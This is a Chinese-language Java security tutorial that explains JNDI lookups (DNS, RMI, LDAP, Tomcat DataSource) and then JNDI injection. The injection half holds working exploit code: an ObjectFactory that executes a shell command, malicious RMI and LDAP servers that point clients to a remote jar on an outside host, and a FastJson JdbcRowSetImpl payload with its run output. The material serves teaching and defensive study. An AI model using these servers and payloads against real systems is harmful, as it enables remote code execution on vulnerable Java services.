# JNDI

`JNDI(Java Naming and Directory Interface)`是Java提供的`Java 命名和目录接口`。通过调用`JNDI`的`API`应用程序可以定位资源和其他程序对象。`JNDI`是`Java EE`的重要部分，需要注意的是它并不只是包含了`DataSource(JDBC 数据源)`，`JNDI`可访问的现有的目录及服务有:`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`。

**Naming Service 命名服务：**

命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。

**Directory Service 目录服务：**

目录服务是命名服务的扩展，除了提供名称和对象的关联，**还允许对象具有属性**。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。

**Reference 引用：**

在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。

更多`JNDI`相关概念参考: [Java技术回顾之JNDI：命名和目录服务基本概念](https://blog.csdn.net/ericxyy/article/details/2012287)

## JNDI目录服务

访问`JNDI`目录服务时会通过预先设置好环境变量访问对应的服务， 如果创建`JNDI`上下文(`Context`)时未指定`环境变量`对象，`JNDI`会自动搜索`系统属性(System.getProperty())`、`applet 参数`和`应用程序资源文件(jndi.properties)`。

**使用`JNDI`创建目录服务对象代码片段：**

```java
// 创建环境变量对象
Hashtable env = new Hashtable();

// 设置JNDI初始化工厂类名
env.put(Context.INITIAL_CONTEXT_FACTORY, "类名");

// 设置JNDI提供服务的URL地址
env.put(Context.PROVIDER_URL, "url");

// 创建JNDI目录服务对象
DirContext context = new InitialDirContext(env);
```

`Context.INITIAL_CONTEXT_FACTORY(初始上下文工厂的环境属性名称)`指的是`JNDI`服务处理的具体类名称，如：`DNS`服务可以使用`com.sun.jndi.dns.DnsContextFactory`类来处理，`JNDI`上下文工厂类必须实现`javax.naming.spi.InitialContextFactory`接口，通过重写`getInitialContext`方法来创建服务。

**javax.naming.spi.InitialContextFactory:**

```java
package javax.naming.spi;

public interface InitialContextFactory {

	public Context getInitialContext(Hashtable<?,?> environment) throws NamingException;
	
}
```

### JNDI-DNS解析

`JNDI`支持访问`DNS`服务，注册环境变量时设置`JNDI`服务处理的工厂类为`com.sun.jndi.dns.DnsContextFactory`即可。

**com.sun.jndi.dns.DnsContextFactory代码片段：**

```java
package com.sun.jndi.dns;

public class DnsContextFactory implements InitialContextFactory {
  
  // 获取处理DNS的JNDI上下文对象
  public Context getInitialContext(Hashtable<?, ?> var1) throws NamingException {
    if (var1 == null) {
      var1 = new Hashtable(5);
    }

    return urlToContext(getInitCtxUrl(var1), var1);
  }
  
  // 省去其他无关方法和变量
}
```

**使用JNDI解析DNS测试：**

```java
package com.anbai.sec.jndi;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;

/**
 * Creator: yz
 * Date: 2019/12/23
 */
public class DNSContextFactoryTest {

   public static void main(String[] args) {
      // 创建环境变量对象
      Hashtable env = new Hashtable();

      // 设置JNDI初始化工厂类名
      env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.dns.DnsContextFactory");

      // 设置JNDI提供服务的URL地址，这里可以设置解析的DNS服务器地址
      env.put(Context.PROVIDER_URL, "dns://223.6.6.6/");

      try {
         // 创建JNDI目录服务对象
         DirContext context = new InitialDirContext(env);

         // 获取DNS解析记录测试
         Attributes attrs1 = context.getAttributes("baidu.com", new String[]{"A"});
         Attributes attrs2 = context.getAttributes("qq.com", new String[]{"A"});

         System.out.println(attrs1);
         System.out.println(attrs2);
      } catch (NamingException e) {
         e.printStackTrace();
      }
   }

}
```

程序运行结果：

```
{a=A: 39.156.69.79, 220.181.38.148}
{a=A: 125.39.52.26, 58.247.214.47, 58.250.137.36}
```

### JNDI-RMI远程方法调用

`RMI`的服务处理工厂类是:`com.sun.jndi.rmi.registry.RegistryContextFactory`，在调用远程的`RMI`方法之前需要先启动`RMI`服务：`com.anbai.sec.rmi.RMIServerTest`，启动完成后就可以使用`JNDI`连接并调用了。

**使用JNDI解析调用远程RMI方法测试：**

```java
package com.anbai.sec.jndi;

import com.anbai.sec.rmi.RMITestInterface;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.rmi.RemoteException;
import java.util.Hashtable;

import static com.anbai.sec.rmi.RMIServerTest.*;

/**
 * Creator: yz
 * Date: 2019/12/24
 */
public class RMIRegistryContextFactoryTest {

   public static void main(String[] args) {
      String providerURL = "rmi://" + RMI_HOST + ":" + RMI_PORT;

      // 创建环境变量对象
      Hashtable env = new Hashtable();

      // 设置JNDI初始化工厂类名
      env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");

      // 设置JNDI提供服务的URL地址
      env.put(Context.PROVIDER_URL, providerURL);

      // 通过JNDI调用远程RMI方法测试，等同于com.anbai.sec.rmi.RMIClientTest类的Demo
      try {
         // 创建JNDI目录服务对象
         DirContext context = new InitialDirContext(env);

         // 通过命名服务查找远程RMI绑定的RMITestInterface对象
         RMITestInterface testInterface = (RMITestInterface) context.lookup(RMI_NAME);

         // 调用远程的RMITestInterface接口的test方法
         String result = testInterface.test();

         System.out.println(result);
      } catch (NamingException e) {
         e.printStackTrace();
      } catch (RemoteException e) {
         e.printStackTrace();
      }
   }

}
```

程序执行结果：

```
Hello RMI~
```

### JNDI-LDAP

`LDAP`的服务处理工厂类是:`com.sun.jndi.ldap.LdapCtxFactory`，连接`LDAP`之前需要配置好远程的`LDAP`服务。

**使用JNDI创建LDAP连接测试：**

```java
package com.anbai.sec.jndi;

import javax.naming.Context;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;

/**
 * Creator: yz
 * Date: 2019/12/24
 */
public class LDAPFactoryTest {

   public static void main(String[] args) {
      try {
         // 设置用户LDAP登陆用户DN
         String userDN = "cn=Manager,dc=javaweb,dc=org";

         // 设置登陆用户密码
         String password = "123456";

         // 创建环境变量对象
         Hashtable<String, Object> env = new Hashtable<String, Object>();

         // 设置JNDI初始化工厂类名
         env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");

         // 设置JNDI提供服务的URL地址
         env.put(Context.PROVIDER_URL, "ldap://localhost:389");

         // 设置安全认证方式
         env.put(Context.SECURITY_AUTHENTICATION, "simple");

         // 设置用户信息
         env.put(Context.SECURITY_PRINCIPAL, userDN);

         // 设置用户密码
         env.put(Context.SECURITY_CREDENTIALS, password);

         // 创建LDAP连接
         DirContext ctx = new InitialDirContext(env);
        
        // 使用ctx可以查询或存储数据,此处省去业务代码

         ctx.close();
      } catch (Exception e) {
         e.printStackTrace();
      }
   }

}
```

### JNDI-DataSource

`JNDI`连接数据源比较特殊，`Java`目前不提供内置的实现方法，提供数据源服务的多是`Servlet容器`，这里我们以`Tomcat`为例学习如何在应用服务中使用`JNDI`查找容器提供的数据源。

`Tomcat`配置`JNDI`数据源需要手动修改`Tomcat目录/conf/context.xml`文件，参考：[Tomcat JNDI Datasource](https://tomcat.apache.org/tomcat-8.0-doc/jndi-datasource-examples-howto.html)，这里我们在`Tomcat`的`conf/context.xml`中添加如下配置：

```xml
<Resource name="jdbc/test" auth="Container" type="javax.sql.DataSource"
               maxTotal="100" maxIdle="30" maxWaitMillis="10000"
               username="root" password="root" driverClassName="com.mysql.jdbc.Driver"
               url="jdbc:mysql://localhost:3306/mysql"/>
```

然后我们需要下载好[Mysql的JDBC驱动包](https://repo1.maven.org/maven2/mysql/mysql-connector-java/5.1.48/mysql-connector-java-5.1.48.jar)并复制到`Tomcat`的`lib`目录：

```
wget https://repo1.maven.org/maven2/mysql/mysql-connector-java/5.1.48/mysql-connector-java-5.1.48.jar -P "/data/apache-tomcat-8.5.31/lib"
```

配置好数据源之后我们重启Tomcat服务就可以使用`JNDI`的方式获取`DataSource`了。

**使用JNDI获取数据源并查询数据库测试：**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.naming.Context" %>
<%@ page import="javax.naming.InitialContext" %>
<%@ page import="javax.sql.DataSource" %>
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.ResultSet" %>
<%
    // 初始化JNDIContext
    Context context = new InitialContext();

    // 搜索Tomcat注册的JNDI数据库连接池对象
    DataSource dataSource = (DataSource) context.lookup("java:comp/env/jdbc/test");

    // 获取数据库连接
    Connection connection = dataSource.getConnection();

    // 查询SQL语句并返回结果
    ResultSet rs = connection.prepareStatement("select version()").executeQuery();

    // 获取数据库查询结果
    while (rs.next()) {
        out.println(rs.getObject(1));
    }

    rs.close();
%>
```

访问`tomcat-datasource-lookup.jsp`输出: `5.7.28`，需要注意的是示例`jsp`中的Demo使用了`系统的环境变量`所以并不需要在创建context的时候传入`环境变量`对象。`Tomcat`在启动的时候会[设置JNDI变量信息](https://github.com/apache/tomcat/blob/407d805f1772ae1dd03b6ffbac03be83f55c406b/java/org/apache/catalina/startup/Catalina.java#L768)，处理`JNDI`服务的类是`org.apache.naming.java.javaURLContextFactory`，所以在`jsp`中我们可以直接创建`context`。

## JNDI-协议转换

如果`JNDI`在`lookup`时没有指定初始化工厂名称，会自动根据协议类型动态查找内置的工厂类然后创建处理对应的服务请求。

`JNDI`默认支持自动转换的协议有：

| 协议名称             | 协议URL        | Context类                                               |
| -------------------- | -------------- | ------------------------------------------------------- |
| DNS协议              | `dns://`       | `com.sun.jndi.url.dns.dnsURLContext`                    |
| RMI协议              | `rmi://`       | `com.sun.jndi.url.rmi.rmiURLContext`                    |
| LDAP协议             | `ldap://`      | `com.sun.jndi.url.ldap.ldapURLContext`                  |
| LDAP协议             | `ldaps://`     | `com.sun.jndi.url.ldaps.ldapsURLContextFactory`         |
| IIOP对象请求代理协议 | `iiop://`      | `com.sun.jndi.url.iiop.iiopURLContext`                  |
| IIOP对象请求代理协议 | `iiopname://`  | `com.sun.jndi.url.iiopname.iiopnameURLContextFactory`   |
| IIOP对象请求代理协议 | `corbaname://` | `com.sun.jndi.url.corbaname.corbanameURLContextFactory` |

**RMI示例代码片段：**

```java
// 创建JNDI目录服务上下文
InitialContext context = new InitialContext();

// 查找JNDI目录服务绑定的对象
Object obj = context.lookup("rmi://127.0.0.1:9527/test");
```

示例代码通过`lookup`会自动使用`rmiURLContext`处理`RMI`请求。

## JNDI-Reference

在`JNDI`服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制。

### RMI/LDAP远程对象引用安全限制

在`RMI`服务中引用远程对象将受本地Java环境限制即本地的`java.rmi.server.useCodebaseOnly`配置必须为`false(允许加载远程对象)`，如果该值为`true`则禁止引用远程对象。除此之外被引用的`ObjectFactory`对象还将受到`com.sun.jndi.rmi.object.trustURLCodebase`配置限制，如果该值为`false(不信任远程引用对象)`一样无法调用远程的引用对象。

1. `JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121`开始`java.rmi.server.useCodebaseOnly`默认配置已经改为了`true`。
2. `JDK 6u132, JDK 7u122, JDK 8u113`开始`com.sun.jndi.rmi.object.trustURLCodebase`默认值已改为了`false`。

本地测试远程对象引用可以使用如下方式允许加载远程的引用对象：

```java
System.setProperty("java.rmi.server.useCodebaseOnly", "false");
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
```

或者在启动`Java`程序时候指定`-D参数`：`-Djava.rmi.server.useCodebaseOnly=false -Dcom.sun.jndi.rmi.object.trustURLCodebase=true`。

`LDAP`在`JDK 11.0.1、8u191、7u201、6u211`后也将默认的`com.sun.jndi.ldap.object.trustURLCodebase`设置为了`false`。

高版本`JDK`可参考：[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)。

### 使用创建恶意的ObjectFactory对象

`JNDI`允许通过*对象工厂* (`javax.naming.spi.ObjectFactory`)动态加载对象实现，例如，当查找绑定在名称空间中的打印机时，如果打印服务将打印机的名称绑定到 Reference，则可以使用该打印机 Reference 创建一个打印机对象，从而查找的调用者可以在查找后直接在该打印机对象上操作。

对象工厂必须实现 `javax.naming.spi.ObjectFactory`接口并重写`getObjectInstance`方法。

**ReferenceObjectFactory示例代码：**

```java
package com.anbai.sec.jndi.injection;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * 引用对象创建工厂
 */
public class ReferenceObjectFactory implements ObjectFactory {

	/**
	 * @param obj  包含可在创建对象时使用的位置或引用信息的对象（可能为 null）。
	 * @param name 此对象相对于 ctx 的名称，如果没有指定名称，则该参数为 null。
	 * @param ctx  一个上下文，name 参数是相对于该上下文指定的，如果 name 相对于默认初始上下文，则该参数为 null。
	 * @param env  创建对象时使用的环境（可能为 null）。
	 * @return 对象工厂创建出的对象
	 * @throws Exception 对象创建异常
	 */
	public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) throws Exception {
		// 在创建对象过程中插入恶意的攻击代码，或者直接创建一个本地命令执行的Process对象从而实现RCE
		return Runtime.getRuntime().exec("curl localhost:9000");
	}

}
```

### 创建恶意的RMI服务

如果我们在`RMI`服务端绑定一个恶意的引用对象，`RMI`客户端在获取服务端绑定的对象时发现是一个`Reference`对象后检查当前`JVM`是否允许加载远程引用对象，如果允许加载且本地不存在此对象工厂类则使用`URLClassLoader`加载远程的`jar`，并加载我们构建的恶意对象工厂(`ReferenceObjectFactory`)类然后调用其中的`getObjectInstance`方法从而触发该方法中的恶意`RCE`代码。

**包含恶意攻击的RMI服务端代码：**

```java
package com.anbai.sec.jndi.injection;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

import static com.anbai.sec.rmi.RMIServerTest.RMI_NAME;
import static com.anbai.sec.rmi.RMIServerTest.RMI_PORT;

/**
 * Creator: yz
 * Date: 2019/12/25
 */
public class RMIReferenceServerTest {

   public static void main(String[] args) {
      try {
         // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
         String url = "http://p2j.cn/tools/jndi-test.jar";

         // 对象的工厂类名
         String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";

         // 监听RMI服务端口
         LocateRegistry.createRegistry(RMI_PORT);

         // 创建一个远程的JNDI对象工厂类的引用对象
         Reference reference = new Reference(className, className, url);

         // 转换为RMI引用对象
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

         // 绑定一个恶意的Remote对象到RMI服务
         Naming.bind(RMI_NAME, referenceWrapper);

         System.out.println("RMI服务启动成功,服务地址:" + RMI_NAME);
      } catch (Exception e) {
         e.printStackTrace();
      }
   }

}
```

程序运行结果：

```
RMI服务启动成功,服务地址:rmi://127.0.0.1:9527/test
```

启动完`RMIReferenceServerTest`后在本地监听`9000`端口测试客户端调用`RMI`方法后是否执行了`curl localhost:9000`命令。

**使用nc监听端口：**

```bash
nc -vv -l 9000
```

**RMI客户端代码：**

```java
package com.anbai.sec.jndi.injection;

import javax.naming.InitialContext;
import javax.naming.NamingException;

import static com.anbai.sec.rmi.RMIServerTest.RMI_NAME;

/**
 * Creator: yz
 * Date: 2019/12/25
 */
public class RMIReferenceClientTest {

   public static void main(String[] args) {
      try {
//       // 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
//       System.setProperty("java.rmi.server.useCodebaseOnly", "false");
//       System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

         InitialContext context = new InitialContext();

         // 获取RMI绑定的恶意ReferenceWrapper对象
         Object obj = context.lookup(RMI_NAME);

         System.out.println(obj);
      } catch (NamingException e) {
         e.printStackTrace();
      }
   }

}
```

程序运行结果：

```
Process[pid=8634, exitValue="not exited"]
```

客户端执行成功后可以在`nc`中看到来自客户端的`curl`请求：

```
GET / HTTP/1.1
Host: localhost:9000
User-Agent: curl/7.64.1
Accept: */*
```

上面的示例演示了在`JVM`默认允许加载远程`RMI`引用对象所带来的`RCE`攻击，但在真实的环境下由于发起`RMI`请求的客户端的`JDK`版本大于我们的测试要求或者网络限制等可能会导致攻击失败。

### 创建恶意的LDAP服务 

`LDAP`和`RMI`同理，测试方法也同上。启动LDAP服务端程序后我们会在`LDAP`请求中返回一个含有恶意攻击代码的对象工厂的远程`jar`地址，客户端会加载我们构建的恶意对象工厂(`ReferenceObjectFactory`)类然后调用其中的`getObjectInstance`方法从而触发该方法中的恶意`RCE`代码。

**包含恶意攻击的LDAP服务端代码：**

```java
package com.anbai.sec.jndi.injection;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

public class LDAPReferenceServerTest {

   // 设置LDAP服务端口
   public static final int SERVER_PORT = 3890;

   // 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
   public static final String BIND_HOST = "127.0.0.1";

   // 设置一个实体名称
   public static final String LDAP_ENTRY_NAME = "test";

   // 获取LDAP服务地址
   public static String LDAP_URL = "ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;

   // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
   public static final String REMOTE_REFERENCE_JAR = "http://p2j.cn/tools/jndi-test.jar";

   // 设置LDAP基底DN
   private static final String LDAP_BASE = "dc=javasec,dc=org";

   public static void main(String[] args) {
      try {
         // 创建LDAP配置对象
         InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);

         // 设置LDAP监听配置信息
         config.setListenerConfigs(new InMemoryListenerConfig(
               "listen", InetAddress.getByName(BIND_HOST), SERVER_PORT,
               ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
               (SSLSocketFactory) SSLSocketFactory.getDefault())
         );

         // 添加自定义的LDAP操作拦截器
         config.addInMemoryOperationInterceptor(new OperationInterceptor());

         // 创建LDAP服务对象
         InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

         // 启动服务
         ds.startListening();

         System.out.println("LDAP服务启动成功,服务地址：" + LDAP_URL);
      } catch (Exception e) {
         e.printStackTrace();
      }
   }

   private static class OperationInterceptor extends InMemoryOperationInterceptor {

      @Override
      public void processSearchResult(InMemoryInterceptedSearchResult result) {
         String base  = result.getRequest().getBaseDN();
         Entry  entry = new Entry(base);

         try {
            // 设置对象的工厂类名
            String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";
            entry.addAttribute("javaClassName", className);
            entry.addAttribute("javaFactory", className);

            // 设置远程的恶意引用对象的jar地址
            entry.addAttribute("javaCodeBase", REMOTE_REFERENCE_JAR);

            // 设置LDAP objectClass
            entry.addAttribute("objectClass", "javaNamingReference");

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Exception e1) {
            e1.printStackTrace();
         }
      }

   }
  
}
```

程序运行结果：

```
LDAP服务启动成功,服务地址：ldap://127.0.0.1:3890/test
```

**LDAP客户端代码：**

```java
package com.anbai.sec.jndi.injection;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

import static com.anbai.sec.jndi.injection.LDAPReferenceServerTest.LDAP_URL;

/**
 * Creator: yz
 * Date: 2019/12/27
 */
public class LDAPReferenceClientTest {

   public static void main(String[] args) {
      try {
//       // 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
//       System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

         Context ctx = new InitialContext();

         // 获取RMI绑定的恶意ReferenceWrapper对象
         Object obj = ctx.lookup(LDAP_URL);

         System.out.println(obj);
      } catch (NamingException e) {
         e.printStackTrace();
      }
   }

}
```

程序运行结果：

```
java.lang.UNIXProcess@184f6be2
```

### JNDI注入漏洞利用

2016年BlackHat大会上[us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)提到了包括`RMI`、`LDAP`、`CORBA`的`JNDI`注入方式攻击方式被广泛的利用于近年来的各种`JNDI`注入漏洞。

触发`JNDI`注入漏洞的方式也是非常的简单，只需要直接或间接的调用`JNDI`服务，且`lookup`的参数值可控、`JDK`版本、服务器网络环境满足漏洞利用条件就可以成功的利用该漏洞了。

**示例代码：**

```java
Context ctx = new InitialContext();

// 获取RMI绑定的恶意ReferenceWrapper对象
Object obj = ctx.lookup("注入JNDI服务URL");
```
我们只需间接的找到调用了`JNDI`的`lookup`方法的类且`lookup` 的`URL`可被我们恶意控制的后端接口或者服务即可利用。

#### FastJson 反序列化JNDI注入示例

比较典型的漏洞有`FastJson`的`JNDI`注入漏洞，`FastJson`在反序列化`JSON`对象时候会通过反射自动创建类实例且`FastJson`会根据传入的`JSON`字段间接的调用类成员变量的`setXXX`方法。`FastJson`这个反序列化功能看似无法实现`RCE`，但是有人找出多个符合`JNDI`注入漏洞利用条件的`Java`类(如：`com.sun.rowset.JdbcRowSetImpl`)从而实现了`RCE`。

**JdbcRowSetImpl示例：**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
<%
    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
    jdbcRowSet.setDataSourceName(request.getParameter("url"));
    jdbcRowSet.setAutoCommit(true);
%>
```

假设我们能够动态的创建出`JdbcRowSetImpl`类实例且可以间接的调用`setDataSourceName`和`setAutoCommit`方法，那么就有可能实现`JNDI`注入攻击。`FastJson`使用`JdbcRowSetImpl`实现`JNDI`注入攻击的大致的流程如下：

1. 反射创建`com.sun.rowset.JdbcRowSetImpl`对象。
2. 反射调用`setDataSourceName`方法，设置`JNDI`的`URL`。
3. 反射调用`setAutoCommit`方法，该方法会试图使用`JNDI`获取数据源(`DataSource`)对象。
4. 调用`lookup`方法去查找我们注入的`URL`所绑定的恶意的`JNDI`远程引用对象。
5. 执行恶意的类对象工厂方法实现RCE。

**FastJson JdbcRowSetImpl Payload：**

```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl", 
    "dataSourceName": "ldap://127.0.0.1:3890/test", 
    "autoCommit": "true"
}
```

**FastJson JNDI测试代码：**

```java
package com.anbai.sec.jndi.injection;

import com.alibaba.fastjson.JSON;

/**
 * Creator: yz
 * Date: 2019/12/28
 */
public class FastJsonRCETest {

	public static void main(String[] args) {
//			// 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
//		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
		String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:3890/test\", \"autoCommit\": \"true\" }";

		Object obj = JSON.parse(json);
		System.out.println(obj);
	}

}
```

程序执行后nc会接收到本机的curl请求表明漏洞已利用成功：

```
GET / HTTP/1.1
Host: localhost:9000
User-Agent: curl/7.64.1
Accept: */*
```

